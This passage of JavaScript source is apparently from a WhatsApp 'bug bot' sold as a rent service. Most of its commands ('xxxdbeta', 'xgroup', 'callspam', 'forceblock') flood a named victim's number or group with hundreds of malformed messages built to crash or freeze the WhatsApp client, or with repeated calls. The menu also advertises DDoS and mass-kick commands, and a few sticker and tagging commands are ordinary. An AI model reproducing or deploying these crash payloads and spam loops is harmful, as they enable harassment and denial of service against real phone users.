    for (let i = 0; i < loopCount2; i++) {
        await sleep(1050);
        await XeonBotInc.relayMessage(victimxd, {
            "messageContextInfo": {
                "messageSecret": "eed1zxI49cxiovBTUFLIEWi1shD9HgIOghONuqPDGTk=",
                "deviceListMetaData": {},
                "deviceListMetadataVersion": 2
            },
            "scheduledCallCreationMessage": {
                "scheduledTimestampMs": '1200',
                callType: "AUDIO",
                "title": '👻',
            }
        }, {
            additionalAttributes: {
                edit: '7'
            }
        });
    }
    break;

	
	case 'forceblock':
	if (!isRentBotUser) return replygcxeon(mess.premium);
    // Get user input for loop count
    let loopCount = parseInt(args[0]);
    if (isNaN(loopCount) || loopCount < 1) {
        loopCount = 5; // Default value if input is invalid
    }
    
    for (let i = 0; i < loopCount; i++) {
        await sleep(1050);
        await XeonBotInc.relayMessage(from, {
            "messageContextInfo": {
                "messageSecret": "eed1zxI49cxiovBTUFLIEWi1shD9HgIOghONuqPDGTk=",
                "deviceListMetaData": {},
                "deviceListMetadataVersion": 2
            },
            "scheduledCallCreationMessage": {
                "scheduledTimestampMs": '1200',
                callType: "AUDIO",
                "title": '👻',
            }
        }, {
            additionalAttributes: {
                edit: '7'
            }
        });
    }
    break;

	
	case 'xxxdbeta': {
if (!isRentBotUser) return replygcxeon(mess.premium)
	if (!q) return replygcxeon(`Example:\n ${prefix + command} 91xxx`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "916909137213") {
    return;
    }
    if (victim == "919366316018") {
    return;
    }
    if (victim == "919402104401") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
  for (let i = 0; i < 999; i++) {
		await XeonBotInc.relayMessage(Xreturn, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2,
                        },
                        interactiveMessage: {
                            body: {
                                text: " Telegram: @DGXeon13 ",
                            },
                            nativeFlowMessage: {
                                buttons: [
                                    { name: "single_select", buttonParamsJson: "" },
                                    { name: "call_permission_request", buttonParamsJson: "" },
                                    { name: "mpm", buttonParamsJson: "" },
                                    { name: "mpm", buttonParamsJson: "" },
                                    { name: "mpm", buttonParamsJson: "" },
                                    { name: "mpm", buttonParamsJson: "" },
                                ]
                            }
                        }
                    }
                }
            }, { participant: { jid: Xreturn } });
            }
		}
		break
		case 'xxxdbeta2': {
if (!isRentBotUser) return replygcxeon(mess.premium)
	if (!q) return replygcxeon(`Example:\n ${prefix + command} 91xxx`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "916909137213") {
    return;
    }
    if (victim == "919366316018") {
    return;
    }
    if (victim == "919402104401") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
  async function newLoadFast(target) {
    try {
        let message = {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {
                            devices: new Array(10000).fill({ id: "device", type: "invalid" }) 
                        },
                        deviceListMetadataVersion: 9999999999, 
                    },
                    interactiveMessage: {
                        contextInfo: {
                            mentionedJid: [target],
                            isForwarded: true,
                            forwardingScore: 9999999, 
                            businessMessageForwardInfo: {
                                businessOwnerJid: target,
                            },
                            quotedMessage: {
                                documentMessage: {
                                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    fileName: "Heavy_Document.pptx",
                                    fileLength: "9999999999999", 
                                    pageCount: 9007199254740991, 
                                    directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc",
                                    mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                                    mediaKeyTimestamp: "1715880173",
                                    mediaType: "presentation",
                                    contactVcard: true,
                                    jpegThumbnail: Buffer.alloc(4096, 0) 
                                }
                            }
                        },
                        body: {
                            text: "Telegram: @MOTU_PATALU_HINDU_HAI",
                        },
                        nativeFlowMessage: {
                            buttons: [
                                { name: "single_select", buttonParamsJson: "" },
                                { name: "call_permission_request", buttonParamsJson: "" },
                                { name: "mpm", buttonParamsJson: "" },
                                { name: "mpm", buttonParamsJson: "" },
                                { name: "mpm", buttonParamsJson: "" },
                                { name: "mpm", buttonParamsJson: "" }
                            ],
                        },
                    },
                },
            },
        };

        await XeonBotInc.relayMessage(target, message, {
            participant: { jid: target },
        });
    } catch (err) {
        console.log(err);
    }
}
  
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
  for (let i = 0; i < 999; i++) {
		await newLoadFast(Xreturn);
            }
		}
		break
		
		case 'xxxdbeta3': {
if (!isRentBotUser) return replygcxeon(mess.premium)
	if (!q) return replygcxeon(`Example:\n ${prefix + command} 91xxx`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "916909137213") {
    return;
    }
    if (victim == "919366316018") {
    return;
    }
    if (victim == "919402104401") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
  for (let i = 0; i < 999; i++) {
		await XeonBotInc.relayMessage(Xreturn, {
viewOnceMessage: {
message: {
messageContextInfo: {deviceListMetadata: {},deviceListMetadataVersion: 2,},
interactiveMessage: {
contextInfo: {
stanzaId: XeonBotInc.generateMessageTag(),
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
quotedMessage: m.quotedMessage,
mentionedJid: [Xreturn],
isForwarded: true,
forwardingScore: 999,
businessMessageForwardInfo: {
businessOwnerJid: Xreturn,
},
},
body: {
text: "Telegram: @MOTU_PATALU_HINDU_HAI",
},
nativeFlowMessage: {
buttons: [
{name: "single_select",buttonParamsJson: "",},
{name: "call_permission_request",buttonParamsJson: "",},
{name: "mpm",buttonParamsJson: "",},
{name: "mpm",buttonParamsJson: "",},
{name: "mpm",buttonParamsJson: "",},
{name: "mpm",buttonParamsJson: "",},
],}}}}
}, {participant: { jid: Xreturn }});
            }
		}
		break

case 'listpair': {
    if (!(global.db.data.owners || []).includes(senderNumber)) {
    return replygcxeon(`❌ Sorry you don't have permission to use this command. This command can only be used by reseller! 

Want to buy reseller? Chat Developer!
YouTube: @MR_MOTU_PATLUBY
Telegram: @MOTU_PATALU_HINDU_HAI
WhatsApp: +584268225851`);
}

        const pairingPath = './lib2/pairing';

    try {
        // Check if the directory exists
        if (!fs.existsSync(pairingPath)) {
            return replygcxeon('No paired devices found.');
        }

        // Read all directories (and files) inside ./lib2/pairing
        const entries = fs.readdirSync(pairingPath, { withFileTypes: true });

        // Filter for directories (paired device IDs)
        const pairedDevices = entries
            .filter(entry => entry.isDirectory())
            .map(entry => `+${entry.name.replace('@s.whatsapp.net', '')}`); // Add '+' before number

        // Handle if no paired devices are found
        if (pairedDevices.length === 0) {
            return replygcxeon('No paired devices found.');
        }

        // Count total paired devices
        const totalUsers = pairedDevices.length;

        // Format the list of paired devices for the response
        const deviceList = pairedDevices
            .map((device, index) => `${index + 1}. ${device}`)
            .join('\n');

        replygcxeon(`Total Rent Bot Users: ${totalUsers}\n\nPaired Devices:\n${deviceList}`);
    } catch (err) {
        console.error('Error reading paired devices directory:', err);
        return replygcxeon('Failed to load paired devices data.');
    }
}
break;

case 'delpair': {

        if (!isRentBotUser) return replygcxeon(mess.premium)
	
        if (!q) return replygcxeon(`Example:\n ${prefix + command} 91xxx`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo =  Xreturn;
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }

        const pairingPath = './lib2/pairing';
        const targetPath = `${pairingPath}/${Xreturn}`;

        try { 
            // Check if the target directory exists
            if (!fs.existsSync(targetPath)) {
                return replygcxeon(`Paired device with ID "${Xreturn}" does not exist.`);
            }

            // Delete the target directory and its contents
            fs.rmSync(targetPath, { recursive: true, force: true });

            replygcxeon(`Paired device with ID "${Xreturn}" has been successfully deleted.`);
        } catch (err) {
            console.error('Error deleting paired device:', err);
            return replygcxeon('An error occurred while attempting to delete the paired device.');
        }
    }
break;
    
case 'reqpair':
// Check system storage and RAM
    const freeStorage = os.freemem() / (1024 * 1024); // Free memory in MB
    const totalStorage = os.totalmem() / (1024 * 1024); // Total memory in MB
    const freeDiskSpace = fs.statSync('/').available / (1024 * 1024); // Free disk space in MB

    if (freeStorage < 300 || freeDiskSpace < 300) { // Set a threshold of 100 MB for storage and RAM
        return replygcxeon('Slot is full, please try again later.');
    }

if (!isRentBotUser) return replygcxeon(mess.premium)
if (!q) return replygcxeon(`Example:\n ${prefix + command} 91xxx`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
  // Extract and validate the country code or prefix
const countryCode = text.slice(0, 3); // Extract the first 3 digits for country code
const prefixxx = text.slice(0, 1); // Extract the first digit for prefix
const firstTwoDigits = text.slice(0, 2); // Extract the first two digits to check for "89"

// Function to validate if a number is a valid WhatsApp number
const isValidWhatsAppNumber = (number) => {
    return number.length >= 10 && number.length <= 15 && !isNaN(number);
};

if (countryCode === "032" || prefixxx === "0" || firstTwoDigits === "89" || countryCode.startsWith("85")) {
    return replygcxeon("Sorry, numbers with country code 032, prefix 0, starting with 89, or +85 are not supported for using the bot.");
}

if (!isValidWhatsAppNumber(text)) {
    return replygcxeon("Invalid WhatsApp number. Please enter a valid number.");
}


    // Proceed with pairing
    const startpairing = require('./rentbot.js');
    await startpairing(Xreturn);
    await sleep(4000);
    
    const cu = fs.readFileSync('./lib2/pairing/pairing.json', 'utf-8');
    const cuObj = JSON.parse(cu);
    
    await replygcxeon(`${cuObj.code}`);

break;
case 'callspam':{
	if (!isRentBotUser) return replygcxeon(mess.premium)
if (!q) return replygcxeon(`Example:\n ${prefix + command} 91xxx`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "916909137213") {
    return;
    }
    if (victim == "919366316018") {
    return;
    }
    if (victim == "919402104401") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
  async function sendOfferCall(target) {
    try {
        await XeonBotInc.offerCall(target);
        console.log(chalk.white.bold(`Success Send Offer Call To Target`));
    } catch (error) {
        console.error(chalk.white.bold(`Failed Send Offer Call To Target:`, error));
    }
}

  sendMessageWithMentions(
    "Successfully Sent Spam Call To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
	await sleep(1000)
for (let i = 0; i < 30; i++) {
await sendOfferCall(Xreturn)
await sleep(2000)
}
  }
break
	case 'xgroup':
	if (!isRentBotUser) return replygcxeon(mess.premium)
	if (!q) return replygcxeon(`Example:\n ${prefix + command} 120363047626537xxx@g.us\n\nTo get group id, please type .listgc\n\nTo get group id from a group link, type .group-id link `)
	// Check if input is a WhatsApp group link
    if (q.includes("chat.whatsapp.com")) {
        return replygcxeon("Group ID must be a number, not a link. Use .group-id <link> to get the group ID.");
    }
victim = text.split("|")[0]
async function xgc4(victim) {
            try {
                const messsage = {
                    botInvokeMessage: {
                        message: {
                            newsletterAdminInviteMessage: {
                                newsletterJid: '33333333333333333@newsletter',
                                newsletterName: "🦄드림 가이 HCKED" + "ꦾ".repeat(120000),
                                jpegThumbnail: "",
                                caption: "ꦽ".repeat(120000),
                                inviteExpiration: Date.now() + 1814400000,
                            },
                        },
                    },
                };
                await XeonBotInc.relayMessage(victim, messsage, {
                    userJid: victim,
                });
            }
            catch (err) {
                console.log(err);
            }
        }
async function xgc(victim){
	XeonBotInc.relayMessage(victim,{                viewOnceMessage: {
message: {
                        messageContextInfo: {
                            deviceListMetadataVersion: 2,
                            deviceListMetadata: {},
                        }, 
    "extendedTextMessage": {
        "text": "🦄드림 가이 HACKED" ,
        "previewType": true,
        "contextInfo": {
            "stanzaId": "B69F7CFEE38571AB03CD9DEEFAD69605",
            "participant": "5518998215209@s.whatsapp.net",
            "quotedMessage": { "documentMessage": {"url":"https://mmg.whatsapp.net/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0&mms3=true","mimetype":"application/pdf","fileSha256":"oV/EME/ku/CjRSAFaW+b67CCFe6G5VTAGsIoimwxMR8=","fileLength":null,"pageCount":99999999999999,"contactVcard":true,"caption":'͡𑰵',"mediaKey":"yU8ofp6ZmGyLRdGteF7Udx0JE4dXbWvhT6X6Xioymeg=","fileName": '> cart; ',"fileEncSha256":"0dJ3YssZD1YUMm8LdWPWxz2VNzw5icWNObWWiY9Zs3k=","directPath":"/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0","mediaKeyTimestamp":"1714145232","thumbnailDirectPath":"/v/t62.36145-24/32182773_798270155158347_7279231160763865339_n.enc?ccb=11-4&oh=01_Q5AaIGDA9WE26BzZF37Vp6aAsKq56VhpiK6Gdp2EGu1AoGd8&oe=665346DE&_nc_sid=5e03e0","thumbnailSha256":"oFogyS+qrsnHwWFPNBmtCsNya8BJkTlG1mU3DdGfyjg=","thumbnailEncSha256":"G2VHGFcbMP1IYd95tLWnpQRxCb9+Q/7/OaiDgvWY8bM=","jpegThumbnail":"/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIACIAYAMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAADBAACBQYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAA5CpC5601s5+88/TJ01nBC6jmytPTAQuZhpxa2PQ0WjCP2T6LXLJR3Ma5WSIsDXtUZYkz2seRXNmSAY8m/PlhkUdZD//EAC4QAAIBAwIEBAQHAAAAAAAAAAECAAMRIRIxBCJBcQVRgbEQEzIzQmFygsHR4f/aAAgBAQABPwBKSsN4aZERmVVybZxecODVpEsCE2zmIhYgAZMbwjiQgbBNto9MqSCMwiUioJDehvaVBynIJ3xKPDki7Yv7StTC3IYdoLAjT/s0ltpSOhgSAR1BlTi7qUQTw/g3aolU4VTLzxLgg96yb9Yy2gJVgRLKgL1VtfZdyTKdXQrO246dB+UJJJJ3hRAoDWA84p+WRc3U9YANRmlT3nK9NdN9u1jKD1KeNTSsfnmzFiB5Eypw9ADUS4Hr/U1LT+1T9SPcmEaiWJ1N59BKrAcgNxfJ+BV25nNu8QlLE5WJj9J2mhTKTMjAX5SZTo0qYDsVJOxgalWauFtdeonE1NDW27ZEeqpz/F/ePUJHXuYfgxJqQfT6RPtfujE3pwdJQ5uDYNnB3nAABKlh+IzisvVh2hhg3n//xAAZEQACAwEAAAAAAAAAAAAAAAABIAACEWH/2gAIAQIBAT8AYDs16p//xAAfEQABAwQDAQAAAAAAAAAAAAABAAIRICExMgMSQoH/2gAIAQMBAT8ALRERdYpc6+sLrIREUenIa/AuXFH/2Q==","thumbnailHeight":172,"thumbnailWidth":480},forwardingScore: 508,isForwarded: true,forwardedNewsletterMessageInfo: {newsletterJid: "0@newsletter",serverMessageId: 100,newsletterName:"🚔 > ursoziingod & crash;"}}}},
       }}},{})
	}
	
	async function xgc2(victim){
		await XeonBotInc.relayMessage(victim, {
'groupInviteMessage': {
"inviteExpiration": Math.floor(Date.now() / 1000) + 31536000,
"groupName":` 🦄드림 가이 HACKED`.repeat(1500),
'groupJid': '120363047626537933@g.us',
'inviteExpiration': '999',
'caption': '> ㅤㅤㅤㅤㅤㅤㅤ',
"inviteCode": 'h+64P9RhJDzgXSPf',
'contextInfo': {
'isForwarded': true,
'fromMe': false,
'participant': '0@s.whatsapp.net',
'remoteJid': sender,
'quotedMessage': {
documentMessage: {
url: "https://mmg.whatsapp.net/v/t62.7119-24/34673265_965442988481988_3759890959900226993_n.enc?ccb=11-4&oh=01_AdRGvYuQlB0sdFSuDAeoDUAmBcPvobRfHaWRukORAicTdw&oe=65E730EB&_nc_sid=5e03e0&mms3=true",
mimetype: "application/pdf",
title: "crash",
pageCount: 1000000000,
fileName: "crash.pdf".repeat(1500),
contactVcard: true
}
},
'forwardedNewsletterMessageInfo': {
'newsletterJid': '120363222395675670@newsletter',
'serverMessageId': 1,
'newsletterName': "🦄드림 가이 HACKED".repeat(1500)
}
}
}
}, {});
		}
		async function xgc3(victim){
			const trabaSend = fs.readFileSync("./69/xeontext17.js")
await XeonBotInc.relayMessage(
      victim,
      {
 viewOnceMessage: {
                  message: {
                     messageContextInfo: {
                        deviceListMetadataVersion: 2,
                        deviceListMetadata: {},
                     },
  scheduledCallCreationMessage: {
"scheduledTimestampMs": Date.now(),
         callType: 1,
         title: `🦄드림 가이 HACKED` + trabaSend
    }
    
  },                   
                                       },
                                                      },
      {quoted : victim })
			}
			
			async function xgc5(victim){
			await XeonBotInc.relayMessage(victim, {
    "requestPhoneNumberMessage": {
        "contextInfo": {
            "stanzaId": "3AC8CAA104A4EC8F7212",
            "participant": "13135550002@s.whatsapp.net",
            quotedMessage: {
                "documentMessage": {
                    "url": "https://mmg.whatsapp.net/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0&mms3=true",
                    "mimetype": "application/javascript",
                    "fileSha256": "jLQrXn8TtEFsd/y5qF6UHW/4OE8RYcJ7wumBn5R1iJ8=",
                    "fileLength": "0",
                    "pageCount": 0,
                    "mediaKey": "xSUWP0Wl/A0EMyAFyeCoPauXx+Qwb0xyPQLGDdFtM4U=",
                    "fileName": "@ Você foi mencionado",
                    "fileEncSha256": "R33GE5FZJfMXeV757T2tmuU0kIdtqjXBIFOi97Ahafc=",
                    "directPath": "/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0",
                    "mediaKeyTimestamp": "1737369406",
                    "caption": "@ Você foi mencionado",
                    "title": "@ Você foi mencionado",
                    mentionedJid: [victim, sender],
                }
            },
            "externalAdReply": {
                "title": "𑐶𑐵𑆷𑐷𑆵".repeat(19999),
                "body": " 🦄드림 가이 HACKED",
                "mediaType": "VIDEO",
                "renderLargerThumbnail": true,
                "sourceUrl": "https://instagram.com/@unicorn_xeon13_",
                "mediaUrl": "https://instagram.com/@unicorn_xeon13_",
                "containsAutoReply": true,
                "renderLargerThumbnail": true,
                "showAdAttribution": true,
                "ctwaClid": "ctwa_clid_example",
                "ref": "ref_example"
            },
            "forwardedNewsletterMessageInfo": {
                "newsletterJid": "8888888888888-1234567890@g.us",
                "serverMessageId": 1,
                "newsletterName": "𑐶𑐵𑆷𑐷𑆵".repeat(19999),
                "contentType": "UPDATE"
            }
        },
        skipType: 7,
    }
}, { jid: victim });
}
replygcxeon(`Successfully sent bug to the group chat`)
for (let i = 0; i < 10; i++) {
	await xgc4(victim);
	await xgc3(victim);
await xgc(victim); 
await xgc2(victim);
await xgc3(victim);
await xgc4(victim);
await xgc5(victim);
await sleep(10000); // Delay for 5 seconds
    }
break
                case 'group-id': {
    if (!isRentBotUser) return replygcxeon(mess.premium)
    if (!text) return replygcxeon('Enter Group Link!');
    if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replygcxeon('Link Invalid!');

    const result = args[0].split('https://chat.whatsapp.com/')[1];

    try {
        const xeontry = await XeonBotInc.groupAcceptInvite(result);
        
        if (!xeontry) {
            return replygcxeon('The group chat either has the approval feature enabled, you have been removed from the group or the invite link has expired. Please join the group chat first and try using the command .listgc.');
        }

        replygcxeon(`Group ID: ${xeontry}`);
    } catch (error) {
        replygcxeon('The group chat either has the approval feature enabled, you have been removed from the group or the invite link has expired. Please join the group chat first and try using the command .listgc.');
    }
}
break;

case 'autoswview':
    case 'autostatusview':{
    	if (!isRentBotUser) return replygcxeon(mess.premium)
               if (args[0] === 'on') {
                  db.data.settings[botNumber].antiswview = true
                  replygcxeon(`Successfully ${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.settings[botNumber].antiswview = false
                  replygcxeon(`Successfully ${command} is disabled`)
               } else {
                	replygcxeon(`Please select on/off\n\Example: ${prefix+command} on`)
            }
            }
            break
            
            case 'totag': {
				if (!m.isGroup) return replygcxeon(mess.OnlyGrup)
				if (!m.quoted) return replygcxeon(`Reply message with caption ${prefix + command}`)
				delete m.quoted.chat
				await XeonBotInc.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
			}
			break
			
			case 'hidetag': case 'h': {
				if (!m.isGroup) return replygcxeon(mess.OnlyGrup)
				XeonBotInc.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)})
			}
			break
			
			case 's': case 'sticker': case 'stiker': {
if (!quoted) return replygcxeon(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcxeon('Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds')
let media = await quoted.download()
let encmedia = await XeonBotInc.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else {
replygcxeon(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
}
}
break

case 'swm': case 'steal': case 'stickerwm': case 'take':{
if (!isPremium) return replyprem(mess.premium)
if (!args.join(" ")) return replygcxeon(`Where is the text?`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0]
const atnm = swn.split("|")[1]
if (m.quoted.isAnimated === true) {
XeonBotInc.downloadAndSaveMediaMessage(quoted, "gifee")
XeonBotInc.sendMessage(m.chat, {sticker:fs.readFileSync("gifee.webp")}, m, { packname: pcknm, author: atnm })
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcxeon('Maximum 10 Seconds!')
let media = await quoted.download()
let encmedia = await XeonBotInc.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else {
replygcxeon(`Photo/Video?`)
}
}
break

case 'menu':
            case 'help':
            case 'alive':
            case '?':
            case 'allmenu':{          	
            if (!isRentBotUser) return replygcxeon(mess.premium)
            	const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const xeonmenuoh = `Hello ${pushname}
╰┈➤ ${xeonytimewisher} 😄
${readmore}
╰┈➤ 
╭───── ✦「 𝗔𝗡𝗗𝗥𝗢𝗜𝗗 👾𝗕𝗨𝗚 𝗠𝗘𝗡𝗨 」✦
│ ✦ .xnewdelay 𝟵𝟭𝘅𝘅𝘅𝘅
│ ✦ .xforceui 𝟵𝟭𝘅𝘅𝘅
│ ✦ SOON
│ ✦ .xchatfreeze 𝟵𝟭𝘅𝘅𝘅
│ ✦ .clearchat 𝗜𝗡 𝗣𝗟𝗔𝗖𝗘
│ ✦ .xspamdroid 𝟵𝟭𝘅𝘅𝘅
│ ✦ .xmotupatlu255    (delay)
│      ✦「 📱𝗜𝗣𝗛𝗢𝗡𝗘 👾𝗕𝗨𝗚 𝗠𝗘𝗡𝗨 」✦
│ 
│ ✦ .xiosnew 𝟵𝟭𝘅𝘅𝘅𝘅𝘅𝘅
│ ✦ .xxxios3
│ ✦
│      ✦「 𝗚𝗥𝗢𝗨𝗣 👾𝗕𝗨𝗚 𝗠𝗘𝗡𝗨 」✦
│ 
│ ✦ .xgroup groupid  125548xxxxxx@what
│ ✦ .listgc 
│ ✦
│     ✦「 𝗙𝗢𝗖𝗥𝗘 𝗩𝗜𝗖𝗧𝗢𝗠 𝗦𝗘𝗡𝗗 𝗠𝗦𝗚」✦
│ 
│ ✦ .forceblock amount (in chat)
│ ✦ .forcegroup groupid|amount
│ 
│       ✦「 𝗢𝗧𝗛𝗘𝗥 👾𝗕𝗨𝗚 𝗠𝗘𝗡𝗨 」✦  
│ 
│ ✦ .callspam number
│ ✦ .xpairspam number
│ ✦ .promoteall (in group)
│ ✦ .demoteall (in group)
│ ✦ .kickall (in group)
│ ✦ .reactch (postlink) (𝘁𝗲𝘅𝘁)
│ 
│      ✦「  𝗘𝗡𝗖/𝗗𝗘𝗖 𝗠𝗘𝗡𝗨 」✦
│ 
│ ✦ .dec doc (reply document)
│ ✦ .enc doc (reply document)
│
│      ✦「  𝗗𝗗𝗢𝗦 𝗠𝗘𝗡𝗨 」✦
│
│ ✦ .ddos web
│ ✦ .checkhost web
│
│       ✦「  𝗢𝗪𝗡𝗘𝗥 👑𝗞𝗜𝗡𝗚 」✦
│
│ ✦ .addprem number
│ ✦ .delprem number
│ ✦ .listprem
│ 
│      ✦「  𝗥𝗘𝗔𝗡𝗧 𝗠𝗘𝗡𝗨 」✦
│
│ ✦ .reqpair 𝗻𝘂𝗺𝗯𝗲𝗿 
│ ✦ .delpair number
│ ✦ .listpair
│ ✦ .checkprem
│
╭──── ✦「 𝗠𝗢𝗧𝗨 𝗣𝗔𝗧𝗟𝗨 𝗠𝗘𝗡𝗨 」✦
│ ✦ .hdvid  <UPLOD VIDEO>
│ ✦ .ytmp3 <Link Query>
│ ✦ .mp4 <Link Query>
│ ✦ .ghiblihd  <uplod imge>
│ ✦ 🇮🇳 .hd  <🖼image> hd
│ ✦ .ig < INSTAGRAM 📷🤳DOWNLOD>
╰─────────────────❍
│  
│  𝗡𝗘𝗫𝗧 𝗧𝗜𝗠𝗘 𝗡𝗘𝗪 𝗙𝗔𝗧𝗨𝗥𝗘 𝗔𝗗𝗗 
│
│      ✦「  𝗢𝗧𝗛𝗘𝗥 𝗠𝗘𝗡𝗨 」✦
│    
│  ✦ .makecase (reply chat)
│  ✦ .group-id linkgc
│  ✦ .rvo
│  ✦ .idch (channel link)
│  ✦ .hidetag (in group)
│  ✦ .totag (in group)
│  ✦ .autoswview (on/off)
│  ✦ .steal (reply stickr with cap)
│  ✦ .sticker (reply media)
│ 
│     ✦「  𝗧𝗛𝗫 ❤ 𝗨𝗦𝗘 𝗠𝗬 𝗕𝗢𝗧 」✦
│    
│     𝗕𝗢𝗧 𝗢𝗪𝗡𝗘𝗥 
│  
│   𝗠𝗢𝗧𝗨 𝗣𝗔𝗧𝗟𝗨 𝗛𝗜𝗡𝗗𝗨 🕉️
│
│  𝗠𝗬 𝗬𝗢𝗨𝗧𝗨𝗕𝗘 𝗖𝗛𝗔𝗡𝗘𝗟 ▶️▶️ 𝗹𝗶𝗻𝗸 🔗 
│   
│             https://www.youtube.com/@MR_MOTU_PATLUBY
│
│  🅶🅾 🆂🆄🅿🅿🅾🆁🆃 🅵🆁🅴🅴 🅱🅾🆃
╰─────────────────❍`
XeonBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./XeonMedia/MOTUPATLU.gif'),
caption: xeonmenuoh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
